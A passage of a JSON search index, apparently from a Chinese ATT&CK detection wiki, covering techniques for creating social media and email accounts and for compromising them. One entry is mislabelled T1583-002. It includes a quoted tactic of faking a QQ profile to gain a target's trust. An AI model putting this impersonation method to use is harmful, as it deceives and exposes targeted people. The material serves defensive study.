770b\u8d77\u6765\u771f\u5b9e\u3002\u8fd9\u53ef\u80fd\u5305\u62ec\u586b\u5199\u4e2a\u4eba\u8d44\u6599\u4fe1\u606f\uff0c\u53d1\u5c55\u793e\u4ea4\u7f51\u7edc\uff0c\u6216\u52a0\u5165\u7167\u7247\u3002 \u4e00\u65e6\u5efa\u7acb\u4e86\u4e00\u4e2a\u89d2\u8272\uff0c\u653b\u51fb\u8005\u5c31\u53ef\u4ee5\u5229\u7528\u5b83\u4e0e\u611f\u5174\u8da3\u7684\u76ee\u6807\u5efa\u7acb\u8054\u7cfb\u3002\u8fd9\u4e9b\u8fde\u63a5\u53ef\u80fd\u662f\u76f4\u63a5\u7684\uff0c\u4e5f\u53ef\u80fd\u5305\u62ec\u8bd5\u56fe\u901a\u8fc7\u4ed6\u4eba\u8fdb\u884c\u8fde\u63a5\u3002\u8fd9\u4e9b\u8d26\u6237\u53ef\u80fd\u4f1a\u5728\u653b\u51fb\u751f\u547d\u5468\u671f\u7684\u5176\u4ed6\u9636\u6bb5\u88ab\u5229\u7528\uff0c\u4f8b\u5982\u5728\u521d\u59cb\u8bbf\u95ee\u671f\u95f4\uff08\u4f8b\u5982\uff1a\u901a\u8fc7\u670d\u52a1\u8fdb\u884c\u9c7c\u53c9\u5f0f\u9493\u9c7c\uff09\u3002","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1585-001-%E5%88%9B%E5%BB%BA%E8%B4%A6%E6%88%B7-%E7%A4%BE%E4%BA%A4%E5%AA%92%E4%BD%93%E8%B4%A6%E6%88%B7/#_1","text":"\u65e0","title":"\u6d4b\u8bd5\u6848\u4f8b"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1585-001-%E5%88%9B%E5%BB%BA%E8%B4%A6%E6%88%B7-%E7%A4%BE%E4%BA%A4%E5%AA%92%E4%BD%93%E8%B4%A6%E6%88%B7/#_2","text":"\u65e0\u6cd5\u6709\u6548\u76d1\u6d4b","title":"\u68c0\u6d4b\u65e5\u5fd7"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1585-001-%E5%88%9B%E5%BB%BA%E8%B4%A6%E6%88%B7-%E7%A4%BE%E4%BA%A4%E5%AA%92%E4%BD%93%E8%B4%A6%E6%88%B7/#_3","text":"\u65e0","title":"\u6d4b\u8bd5\u590d\u73b0"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1585-001-%E5%88%9B%E5%BB%BA%E8%B4%A6%E6%88%B7-%E7%A4%BE%E4%BA%A4%E5%AA%92%E4%BD%93%E8%B4%A6%E6%88%B7/#_4","text":"\u65e0","title":"\u6d4b\u8bd5\u7559\u75d5"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1585-001-%E5%88%9B%E5%BB%BA%E8%B4%A6%E6%88%B7-%E7%A4%BE%E4%BA%A4%E5%AA%92%E4%BD%93%E8%B4%A6%E6%88%B7/#_5","text":"\u65e0","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1585-001-%E5%88%9B%E5%BB%BA%E8%B4%A6%E6%88%B7-%E7%A4%BE%E4%BA%A4%E5%AA%92%E4%BD%93%E8%B4%A6%E6%88%B7/#_6","text":"","title":"\u5efa\u8bae"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1585-001-%E5%88%9B%E5%BB%BA%E8%B4%A6%E6%88%B7-%E7%A4%BE%E4%BA%A4%E5%AA%92%E4%BD%93%E8%B4%A6%E6%88%B7/#_7","text":"\u8fd9\u79cd\u6280\u672f\u4e0d\u5bb9\u6613\u7528\u9884\u9632\u63a7\u5236\u6765\u7f13\u89e3\uff0c\u56e0\u4e3a\u5b83\u662f\u57fa\u4e8e\u4f01\u4e1a\u9632\u5fa1\u548c\u63a7\u5236\u8303\u56f4\u4e4b\u5916\u7684\u884c\u4e3a\u3002","title":"\u7f13\u89e3\u63aa\u65bd"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1585-001-%E5%88%9B%E5%BB%BA%E8%B4%A6%E6%88%B7-%E7%A4%BE%E4%BA%A4%E5%AA%92%E4%BD%93%E8%B4%A6%E6%88%B7/#_8","text":"\u8003\u8651\u76d1\u6d4b\u4e0e\u4f60\u7684\u7ec4\u7ec7\u6709\u5173\u7684\u793e\u4ea4\u5a92\u4f53\u6d3b\u52a8\u3002\u53ef\u7591\u7684\u6d3b\u52a8\u53ef\u80fd\u5305\u62ec\u58f0\u79f0\u4e3a\u60a8\u7684\u7ec4\u7ec7\u5de5\u4f5c\u7684\u89d2\u8272\uff0c\u6216\u6700\u8fd1\u4fee\u6539\u8fc7\u7684\u8d26\u6237\u5411\u4e0e\u60a8\u7684\u7ec4\u7ec7\u76f8\u5173\u7684\u8d26\u6237\u63d0\u51fa\u5927\u91cf\u8fde\u63a5\u8bf7\u6c42\u3002 \u68c0\u6d4b\u5de5\u4f5c\u53ef\u4ee5\u96c6\u4e2d\u5728\u653b\u51fb\u751f\u547d\u5468\u671f\u7684\u76f8\u5173\u9636\u6bb5\uff0c\u4f8b\u5982\u5728\u521d\u59cb\u8bbf\u95ee\u671f\u95f4\uff08\u4f8b\u5982\uff1a\u901a\u8fc7\u670d\u52a1\u8fdb\u884c\u9c7c\u53c9\u5f0f\u9493\u9c7c\uff09\u3002","title":"\u68c0\u6d4b"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1585-001-%E5%88%9B%E5%BB%BA%E8%B4%A6%E6%88%B7-%E7%A4%BE%E4%BA%A4%E5%AA%92%E4%BD%93%E8%B4%A6%E6%88%B7/#_9","text":"MITRE-ATT&CK-T1585-001 https://attack.mitre.org/techniques/T1585/001/","title":"\u53c2\u8003\u63a8\u8350"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1585-002-%E5%88%9B%E5%BB%BA%E8%B4%A6%E6%88%B7-%E7%94%B5%E5%AD%90%E9%82%AE%E7%AE%B1%E8%B4%A6%E6%88%B7/","text":"T1583-002-\u76d7\u53d6\u8d26\u6237-\u7535\u5b50\u90ae\u7bb1\u8d26\u6237 \u6765\u81eaATT&CK\u7684\u63cf\u8ff0 \u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u521b\u5efa\u53ef\u5728\u653b\u51fb\u76ee\u6807\u4e2d\u4f7f\u7528\u7684\u7535\u5b50\u90ae\u4ef6\u8d26\u6237\u3002\u653b\u51fb\u8005\u53ef\u4ee5\u4f7f\u7528\u5728\u7535\u5b50\u90ae\u4ef6\u4f9b\u5e94\u5546\u5904\u521b\u5efa\u7684\u8d26\u6237\u6765\u63a8\u8fdb\u4ed6\u4eec\u7684\u884c\u52a8\uff0c\u4f8b\u5982\u5229\u7528\u5b83\u4eec\u6765\u8fdb\u884c \"\u4fe1\u606f\u9493\u9c7c \"\u6216 \"\u7f51\u7edc\u9493\u9c7c\"\u3002\u653b\u51fb\u8005\u8fd8\u53ef\u4ee5\u91c7\u53d6\u63aa\u65bd\uff0c\u56f4\u7ed5\u7535\u5b50\u90ae\u4ef6\u8d26\u6237\u57f9\u517b\u4e00\u4e2a\u89d2\u8272\uff0c\u4f8b\u5982\u901a\u8fc7\u4f7f\u7528\u793e\u4ea4\u5a92\u4f53\u8d26\u6237\uff0c\u4ee5\u589e\u52a0\u540e\u7eed\u884c\u4e3a\u7684\u6210\u529f\u673a\u4f1a\u3002\u521b\u5efa\u7684\u7535\u5b50\u90ae\u4ef6\u8d26\u6237\u4e5f\u53ef\u7528\u4e8e\u83b7\u53d6\u57fa\u7840\u8bbe\u65bd\uff08\u4f8b\u5982\uff1a\u57df\u540d\uff09\u3002 \u4e3a\u4e86\u51cf\u5c11\u5c06\u884c\u52a8\u4e0e\u81ea\u5df1\u8054\u7cfb\u8d77\u6765\u7684\u673a\u4f1a\uff0c\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u4f7f\u7528\u4e00\u6b21\u6027\u7684\u7535\u5b50\u90ae\u4ef6\u670d\u52a1\u3002 \u6d4b\u8bd5\u6848\u4f8b \u65e0 \u68c0\u6d4b\u65e5\u5fd7 \u65e0\u6cd5\u6709\u6548\u76d1\u6d4b \u6d4b\u8bd5\u590d\u73b0 \u65e0 \u6d4b\u8bd5\u7559\u75d5 \u65e0 \u68c0\u6d4b\u89c4\u5219/\u601d\u8def \u65e0 \u5efa\u8bae \u7f13\u89e3\u63aa\u65bd \u8fd9\u79cd\u6280\u672f\u4e0d\u5bb9\u6613\u7528\u9884\u9632\u63a7\u5236\u6765\u7f13\u89e3\uff0c\u56e0\u4e3a\u5b83\u662f\u57fa\u4e8e\u4f01\u4e1a\u9632\u5fa1\u548c\u63a7\u5236\u8303\u56f4\u4e4b\u5916\u7684\u884c\u4e3a\u3002 \u68c0\u6d4b \u5927\u90e8\u5206\u6b64\u7c7b\u6d3b\u52a8\u5c06\u5728\u76ee\u6807\u7ec4\u7ec7\u7684\u53ef\u89c1\u6027\u4e4b\u5916\u8fdb\u884c\uff0c\u56e0\u6b64\u5f88\u96be\u68c0\u6d4b\u5230\u8fd9\u79cd\u884c\u4e3a\u3002\u68c0\u6d4b\u5de5\u4f5c\u53ef\u80fd\u96c6\u4e2d\u5728\u653b\u51fb\u751f\u547d\u5468\u671f\u7684\u76f8\u5173\u9636\u6bb5\uff0c\u4f8b\u5982\u5728\u521d\u59cb\u8bbf\u95ee\u671f\u95f4\uff08\u4f8b\u5982\uff1a\u7f51\u7edc\u9493\u9c7c\uff09\u3002 \u53c2\u8003\u63a8\u8350 MITRE-ATT&CK-T1585-002 https://attack.mitre.org/techniques/T1585/002/","title":"T1583-002-\u76d7\u53d6\u8d26\u6237-\u7535\u5b50\u90ae\u7bb1\u8d26\u6237"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1585-002-%E5%88%9B%E5%BB%BA%E8%B4%A6%E6%88%B7-%E7%94%B5%E5%AD%90%E9%82%AE%E7%AE%B1%E8%B4%A6%E6%88%B7/#t1583-002-","text":"","title":"T1583-002-\u76d7\u53d6\u8d26\u6237-\u7535\u5b50\u90ae\u7bb1\u8d26\u6237"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1585-002-%E5%88%9B%E5%BB%BA%E8%B4%A6%E6%88%B7-%E7%94%B5%E5%AD%90%E9%82%AE%E7%AE%B1%E8%B4%A6%E6%88%B7/#attck","text":"\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u521b\u5efa\u53ef\u5728\u653b\u51fb\u76ee\u6807\u4e2d\u4f7f\u7528\u7684\u7535\u5b50\u90ae\u4ef6\u8d26\u6237\u3002\u653b\u51fb\u8005\u53ef\u4ee5\u4f7f\u7528\u5728\u7535\u5b50\u90ae\u4ef6\u4f9b\u5e94\u5546\u5904\u521b\u5efa\u7684\u8d26\u6237\u6765\u63a8\u8fdb\u4ed6\u4eec\u7684\u884c\u52a8\uff0c\u4f8b\u5982\u5229\u7528\u5b83\u4eec\u6765\u8fdb\u884c \"\u4fe1\u606f\u9493\u9c7c \"\u6216 \"\u7f51\u7edc\u9493\u9c7c\"\u3002\u653b\u51fb\u8005\u8fd8\u53ef\u4ee5\u91c7\u53d6\u63aa\u65bd\uff0c\u56f4\u7ed5\u7535\u5b50\u90ae\u4ef6\u8d26\u6237\u57f9\u517b\u4e00\u4e2a\u89d2\u8272\uff0c\u4f8b\u5982\u901a\u8fc7\u4f7f\u7528\u793e\u4ea4\u5a92\u4f53\u8d26\u6237\uff0c\u4ee5\u589e\u52a0\u540e\u7eed\u884c\u4e3a\u7684\u6210\u529f\u673a\u4f1a\u3002\u521b\u5efa\u7684\u7535\u5b50\u90ae\u4ef6\u8d26\u6237\u4e5f\u53ef\u7528\u4e8e\u83b7\u53d6\u57fa\u7840\u8bbe\u65bd\uff08\u4f8b\u5982\uff1a\u57df\u540d\uff09\u3002 \u4e3a\u4e86\u51cf\u5c11\u5c06\u884c\u52a8\u4e0e\u81ea\u5df1\u8054\u7cfb\u8d77\u6765\u7684\u673a\u4f1a\uff0c\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u4f7f\u7528\u4e00\u6b21\u6027\u7684\u7535\u5b50\u90ae\u4ef6\u670d\u52a1\u3002","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1585-002-%E5%88%9B%E5%BB%BA%E8%B4%A6%E6%88%B7-%E7%94%B5%E5%AD%90%E9%82%AE%E7%AE%B1%E8%B4%A6%E6%88%B7/#_1","text":"\u65e0","title":"\u6d4b\u8bd5\u6848\u4f8b"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1585-002-%E5%88%9B%E5%BB%BA%E8%B4%A6%E6%88%B7-%E7%94%B5%E5%AD%90%E9%82%AE%E7%AE%B1%E8%B4%A6%E6%88%B7/#_2","text":"\u65e0\u6cd5\u6709\u6548\u76d1\u6d4b","title":"\u68c0\u6d4b\u65e5\u5fd7"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1585-002-%E5%88%9B%E5%BB%BA%E8%B4%A6%E6%88%B7-%E7%94%B5%E5%AD%90%E9%82%AE%E7%AE%B1%E8%B4%A6%E6%88%B7/#_3","text":"\u65e0","title":"\u6d4b\u8bd5\u590d\u73b0"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1585-002-%E5%88%9B%E5%BB%BA%E8%B4%A6%E6%88%B7-%E7%94%B5%E5%AD%90%E9%82%AE%E7%AE%B1%E8%B4%A6%E6%88%B7/#_4","text":"\u65e0","title":"\u6d4b\u8bd5\u7559\u75d5"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1585-002-%E5%88%9B%E5%BB%BA%E8%B4%A6%E6%88%B7-%E7%94%B5%E5%AD%90%E9%82%AE%E7%AE%B1%E8%B4%A6%E6%88%B7/#_5","text":"\u65e0","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1585-002-%E5%88%9B%E5%BB%BA%E8%B4%A6%E6%88%B7-%E7%94%B5%E5%AD%90%E9%82%AE%E7%AE%B1%E8%B4%A6%E6%88%B7/#_6","text":"","title":"\u5efa\u8bae"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1585-002-%E5%88%9B%E5%BB%BA%E8%B4%A6%E6%88%B7-%E7%94%B5%E5%AD%90%E9%82%AE%E7%AE%B1%E8%B4%A6%E6%88%B7/#_7","text":"\u8fd9\u79cd\u6280\u672f\u4e0d\u5bb9\u6613\u7528\u9884\u9632\u63a7\u5236\u6765\u7f13\u89e3\uff0c\u56e0\u4e3a\u5b83\u662f\u57fa\u4e8e\u4f01\u4e1a\u9632\u5fa1\u548c\u63a7\u5236\u8303\u56f4\u4e4b\u5916\u7684\u884c\u4e3a\u3002","title":"\u7f13\u89e3\u63aa\u65bd"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1585-002-%E5%88%9B%E5%BB%BA%E8%B4%A6%E6%88%B7-%E7%94%B5%E5%AD%90%E9%82%AE%E7%AE%B1%E8%B4%A6%E6%88%B7/#_8","text":"\u5927\u90e8\u5206\u6b64\u7c7b\u6d3b\u52a8\u5c06\u5728\u76ee\u6807\u7ec4\u7ec7\u7684\u53ef\u89c1\u6027\u4e4b\u5916\u8fdb\u884c\uff0c\u56e0\u6b64\u5f88\u96be\u68c0\u6d4b\u5230\u8fd9\u79cd\u884c\u4e3a\u3002\u68c0\u6d4b\u5de5\u4f5c\u53ef\u80fd\u96c6\u4e2d\u5728\u653b\u51fb\u751f\u547d\u5468\u671f\u7684\u76f8\u5173\u9636\u6bb5\uff0c\u4f8b\u5982\u5728\u521d\u59cb\u8bbf\u95ee\u671f\u95f4\uff08\u4f8b\u5982\uff1a\u7f51\u7edc\u9493\u9c7c\uff09\u3002","title":"\u68c0\u6d4b"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1585-002-%E5%88%9B%E5%BB%BA%E8%B4%A6%E6%88%B7-%E7%94%B5%E5%AD%90%E9%82%AE%E7%AE%B1%E8%B4%A6%E6%88%B7/#_9","text":"MITRE-ATT&CK-T1585-002 https://attack.mitre.org/techniques/T1585/002/","title":"\u53c2\u8003\u63a8\u8350"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1586-001-%E7%9B%97%E5%8F%96%E8%B4%A6%E6%88%B7-%E7%A4%BE%E4%BA%A4%E5%AA%92%E4%BD%93%E8%B4%A6%E6%88%B7/","text":"T1586-001-\u76d7\u53d6\u8d26\u6237-\u793e\u4ea4\u5a92\u4f53\u8d26\u6237 \u6765\u81eaATT&CK\u7684\u63cf\u8ff0 \u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u76d7\u53d6\u793e\u4ea4\u5a92\u4f53\u8d26\u6237\uff0c\u8fd9\u4e9b\u8d26\u6237\u53ef\u4ee5\u5728\u76ee\u6807\u653b\u51fb\u4e2d\u4f7f\u7528\u3002\u5bf9\u4e8e\u5305\u542b\u793e\u4f1a\u5de5\u7a0b\u7684\u884c\u52a8\uff0c\u5229\u7528\u5728\u7ebf\u89d2\u8272\u53ef\u80fd\u5f88\u91cd\u8981\u3002\u4e0e\u5176\u521b\u5efa\u548c\u57f9\u517b\u793e\u4ea4\u5a92\u4f53\u6863\u6848\uff08\u5373\u793e\u4ea4\u5a92\u4f53\u8d26\u6237\uff09\uff0c\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u76d7\u7528\u73b0\u6709\u7684\u793e\u4ea4\u5a92\u4f53\u8d26\u6237\u3002\u5982\u679c\u6f5c\u5728\u7684\u53d7\u5bb3\u8005\u4e0e\u88ab\u653b\u51fb\u8005\u6709\u5173\u7cfb\uff0c\u6216\u8005\u77e5\u9053\u88ab\u653b\u51fb\u8005\u7684\u60c5\u51b5\uff0c\u90a3\u4e48\u5229\u7528\u73b0\u6709\u7684\u89d2\u8272\u53ef\u4ee5\u4f7f\u4ed6\u4eec\u4ea7\u751f\u4e00\u5b9a\u7a0b\u5ea6\u7684\u4fe1\u4efb\u3002 \u7834\u574f\u793e\u4ea4\u5a92\u4f53\u8d26\u6237\u7684\u65b9\u6cd5\u6709\u5f88\u591a\uff0c\u6bd4\u5982\u901a\u8fc7\u9493\u9c7c\u7f51\u7ad9\u6536\u96c6\u4fe1\u606f\uff0c\u4ece\u7b2c\u4e09\u65b9\u7f51\u7ad9\u8d2d\u4e70\u4fe1\u606f\uff0c\u6216\u8005\u901a\u8fc7\u66b4\u529b\u7834\u89e3\u4fe1\u606f\uff08\u4f8b\u5982\uff1a\u4ece\u6cc4\u9732\u7684\u4fe1\u606f\u8f6c\u50a8\u4e2d\u91cd\u590d\u4f7f\u7528\u5bc6\u7801\uff0c\u7b80\u5355\u7406\u89e3\uff1a\u5c31\u662f\u649e\u5e93\uff09\u5728\u76d7\u7528\u793e\u4ea4\u5a92\u4f53\u8d26\u6237\u4e4b\u524d\uff0c\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u8fdb\u884c\u4fa6\u5bdf\uff0c\u4ee5\u51b3\u5b9a\u7834\u574f\u54ea\u4e9b\u8d26\u6237\u6765\u63a8\u8fdb\u5176\u884c\u52a8\u3002 \u793e\u4ea4\u5a92\u4f53\u8d26\u6237\uff08\u89d2\u8272\uff09\u53ef\u80fd\u5b58\u5728\u4e8e\u4e00\u4e2a\u7f51\u7ad9\u6216\u591a\u4e2a\u7f51\u7ad9\u4e0a\uff08\u4f8b\u5982\uff1aFacebook\u3001LinkedIn\u3001Twitter\u7b49\uff09\u3002\u88ab\u5165\u4fb5\u7684\u793e\u4ea4\u5a92\u4f53\u8d26\u6237\u53ef\u80fd\u9700\u8981\u989d\u5916\u7684\u5f00\u53d1\uff0c\u8fd9\u53ef\u80fd\u5305\u62ec\u586b\u5199\u6216\u4fee\u6539\u4e2a\u4eba\u8d44\u6599\u4fe1\u606f\uff0c\u8fdb\u4e00\u6b65\u5f00\u53d1\u793e\u4ea4\u7f51\u7edc\uff0c\u6216\u52a0\u5165\u7167\u7247\u3002 \u653b\u51fb\u8005\u53ef\u4ee5\u5229\u7528\u88ab\u76d7\u7528\u7684\u793e\u4ea4\u5a92\u4f53\u8d44\u6599\u521b\u5efa\u65b0\u7684\uff0c\u6216\u52ab\u6301\u73b0\u6709\u7684\uff0c\u4e0e\u611f\u5174\u8da3\u7684\u76ee\u6807\u7684\u8054\u7cfb\u3002\u8fd9\u4e9b\u8fde\u63a5\u53ef\u80fd\u662f\u76f4\u63a5\u7684\uff0c\u4e5f\u53ef\u80fd\u5305\u62ec\u8bd5\u56fe\u901a\u8fc7\u4ed6\u4eba\u8fdb\u884c\u8fde\u63a5\u3002\u5728\u653b\u51fb\u751f\u547d\u5468\u671f\u7684\u5176\u4ed6\u9636\u6bb5\uff0c\u4f8b\u5982\u5728\u521d\u59cb\u8bbf\u95ee\u671f\u95f4\uff08\u4f8b\u5982\uff1a\u901a\u8fc7\u670d\u52a1\u8fdb\u884c\u7f51\u7edc\u9493\u9c7c\uff09\uff0c\u53ef\u4ee5\u5229\u7528\u88ab\u76d7\u7528\u7684\u8d26\u6237\u3002 \u6d4b\u8bd5\u6848\u4f8b \u7b80\u5355\u7406\u89e3\uff1a\u76d7\u7528\u4e00\u4e9b\u793e\u4ea4\u5a92\u4f53\u8d26\u6237\uff0c\u6bd4\u5982xxx\u516c\u53f8\u7684\u8d22\u52a1\u4eba\u5458\uff0c\u7136\u540e\u901a\u8fc7\u8be5\u8d26\u6237\u548c\u5176\u4ed6\u5458\u5de5\u6c9f\u901a\u4ea4\u6d41\uff0c\u6216\u8005\u76f4\u63a5\u5229\u7528\u8be5\u8d26\u6237\u548c\u76ee\u6807\u8fdb\u884c\u6c9f\u901a\u3002\u6bd4\u5982\u6700\u5e38\u89c1\u7684\u5b9a\u4f4d\u653b\u51fb\u4eba\u5458\u8eab\u4efd\u4fe1\u606f\uff0c\u901a\u8fc7QQ\u8054\u7cfb\uff0c\u5c06\u81ea\u5df1\u7684QQ\u4fe1\u606f\u66f4\u6539\u4e3a\u548c\u653b\u51fb\u4eba\u5458\u5177\u6709\u4e00\u5b9a\u7684\u76f8\u4f3c\u4e4b\u5904\uff08\u540c\u4e00\u6240\u5b66\u6821\u3001\u540c\u4e00\u4e2a\u4e13\u4e1a\u7b49\uff09\uff0c\u53ef\u4ee5\u5e2e\u52a9\u4f60\u83b7\u53d6\u5230\u4e00\u5b9a\u7a0b\u5ea6\u7684\u4fe1\u4efb\u3002\u8fd9\u662f\u6eaf\u6e90\u653b\u51fb\u4eba\u5458\u8eab\u4efd\u7684\u65b9\u5f0f\u4e4b\u4e00\uff0c\u540c\u6837\u4e5f\u53ef\u4ee5\u662f\u653b\u51fb\u8005\u5bf9\u653b\u51fb\u76ee\u6807\u8fdb\u884c\u793e\u4f1a\u5de5\u7a0b\u884c\u52a8\u7684\u4e00\u90e8\u5206\u3002 \u5177\u4f53\u6848\u4f8b\u53ef\u53c2\u8003\uff1a \u8bb0\u4e00\u6b21\u8270\u96be\u7684\u6eaf\u6e90\u6545\u4e8b\uff08\u5bf9\u4e0d\u8d77\u5b66\u957f\uff09\uff1a https://xz.aliyun.com/t/9582 \u6709\u8fd9\u4e48\u4e00\u6bb5\u63cf\u8ff0\uff1a\u201d\u7528\u4e00\u4e2aqq\u7b49\u7ea7\u9ad8\u70b9\u7684\u5c0f\u53f7\uff0c\u4fee\u6539\u597d\u8d44\u6599\uff0c99\u5e74\uff0c18\u5c4a\uff0c\u67d0\u67d0\u9662\u6821\uff0c\u8ba1\u7b97\u673a\u4e13\u4e1a\uff0c\u7a7a\u95f4\u641e\u4e86\u4e9b\u5728\u8d34\u5427\u627e\u7684\u5b66\u6821\u7167\u7247\u3002\u5199\u4e0a18\u5c4a\u7684\u5b66\u5f1f\u60f3\u54a8\u8be2\u5c31\u4e1a\u4fe1\u606f\uff0c\u8ba2~\u597d\u53cb\u7533\u8bf7\u5df2\u53d1\u9001\u3002\u65e2\u7136\u662f\u505a\u68a6\uff0c\u80af\u5b9a\u662f\u534a\u591c\uff0c\u5e94\u8be5\u662f12\u70b9\u5de6\u53f3\u770b\u5230\u901a\u8fc7\u4e86\u8bf7\u6c42\uff0c\u4e5f\u5c31\u8fc7\u4e86\u5341\u6765\u5206\u949f\u5427\u3002\u6b63\u51c6\u5907\u53d1\u6784\u601d\u597d\u7684\u95ee\u5019\u5b66\u957f\u7684\u8bdd\u3002\u597d\u5bb6\u4f19\uff0c\u76f4\u63a5\u7ed9\u6211\u6765\u4e86\u4e00\u5927\u6ce2\u5185\u63a8\u3002\u8fd9\u91cc\u6697\u793a\u7684\u63d0\u4e86\u4e00\u4e0b\u81ea\u5df1\u662f\u505a\u5f00\u53d1\u7684\u4e0d\u662f\u7f51\u7edc\u5b89\u5168\u964d\u4f4e\u8b66\u60d5\u5fc3\u3002\u201c \u68c0\u6d4b\u65e5\u5fd7 \u65e0\u6cd5\u6709\u6548\u76d1\u6d4b \u6d4b\u8bd5\u590d\u73b0 \u65e0 \u6d4b\u8bd5\u7559\u75d5 \u65e0 \u68c0\u6d4b\u89c4\u5219/\u601d\u8def \u65e0 \u5efa\u8bae \u7f13\u89e3\u63aa\u65bd \u8fd9\u79cd\u6280\u672f\u4e0d\u5bb9\u6613\u7528\u9884\u9632\u63a7\u5236\u6765\u7f13\u89e3\uff0c\u56e0\u4e3a\u5b83\u662f\u57fa\u4e8e\u4f01\u4e1a\u9632\u5fa1\u548c\u63a7\u5236\u8303\u56f4\u4e4b\u5916\u7684\u884c\u4e3a\u3002 \u68c0\u6d4b \u8003\u8651\u76d1\u6d4b\u4e0e\u4f60\u7684\u7ec4\u7ec7\u6709\u5173\u7684\u793e\u4ea4\u5a92\u4f53\u6d3b\u52a8\u3002\u53ef\u7591\u7684\u6d3b\u52a8\u53ef\u80fd\u5305\u62ec\u58f0\u79f0\u4e3a\u60a8\u7684\u7ec4\u7ec7\u5de5\u4f5c\u7684\u89d2\u8272\uff0c\u6216\u6700\u8fd1\u4fee\u6539\u8fc7\u7684\u8d26\u6237\u5411\u4e0e\u60a8\u7684\u7ec4\u7ec7\u76f8\u5173\u7684\u8d26\u6237\u63d0\u51fa\u5927\u91cf\u8fde\u63a5\u8bf7\u6c42\u3002 \u68c0\u6d4b\u5de5\u4f5c\u53ef\u4ee5\u96c6\u4e2d\u5728\u653b\u51fb\u751f\u547d\u5468\u671f\u7684\u76f8\u5173\u9636\u6bb5\uff0c\u4f8b\u5982\u5728\u521d\u59cb\u8bbf\u95ee\u671f\u95f4\uff08\u4f8b\u5982\uff1a\u901a\u8fc7\u670d\u52a1\u8fdb\u884c\u9c7c\u53c9\u5f0f\u9493\u9c7c\uff09\u3002 \u53c2\u8003\u63a8\u8350 MITRE-ATT&CK-T1586-001 https://attack.mitre.org/techniques/T1586/001/ \u8bb0\u4e00\u6b21\u8270\u96be\u7684\u6eaf\u6e90\u6545\u4e8b\uff08\u5bf9\u4e0d\u8d77\u5b66\u957f\uff09 https://xz.aliyun.com/t/9582","title":"T1586-001-\u76d7\u53d6\u8d26\u6237-\u793e\u4ea4\u5a92\u4f53\u8d26\u6237"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1586-001-%E7%9B%97%E5%8F%96%E8%B4%A6%E6%88%B7-%E7%A4%BE%E4%BA%A4%E5%AA%92%E4%BD%93%E8%B4%A6%E6%88%B7/#t1586-001-","text":"","title":"T1586-001-\u76d7\u53d6\u8d26\u6237-\u793e\u4ea4\u5a92\u4f53\u8d26\u6237"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1586-001-%E7%9B%97%E5%8F%96%E8%B4%A6%E6%88%B7-%E7%A4%BE%E4%BA%A4%E5%AA%92%E4%BD%93%E8%B4%A6%E6%88%B7/#attck","text":"\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u76d7\u53d6\u793e\u4ea4\u5a92\u4f53\u8d26\u6237\uff0c\u8fd9\u4e9b\u8d26\u6237\u53ef\u4ee5\u5728\u76ee\u6807\u653b\u51fb\u4e2d\u4f7f\u7528\u3002\u5bf9\u4e8e\u5305\u542b\u793e\u4f1a\u5de5\u7a0b\u7684\u884c\u52a8\uff0c\u5229\u7528\u5728\u7ebf\u89d2\u8272\u53ef\u80fd\u5f88\u91cd\u8981\u3002\u4e0e\u5176\u521b\u5efa\u548c\u57f9\u517b\u793e\u4ea4\u5a92\u4f53\u6863\u6848\uff08\u5373\u793e\u4ea4\u5a92\u4f53\u8d26\u6237\uff09\uff0c\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u76d7\u7528\u73b0\u6709\u7684\u793e\u4ea4\u5a92\u4f53\u8d26\u6237\u3002\u5982\u679c\u6f5c\u5728\u7684\u53d7\u5bb3\u8005\u4e0e\u88ab\u653b\u51fb\u8005\u6709\u5173\u7cfb\uff0c\u6216\u8005\u77e5\u9053\u88ab\u653b\u51fb\u8005\u7684\u60c5\u51b5\uff0c\u90a3\u4e48\u5229\u7528\u73b0\u6709\u7684\u89d2\u8272\u53ef\u4ee5\u4f7f\u4e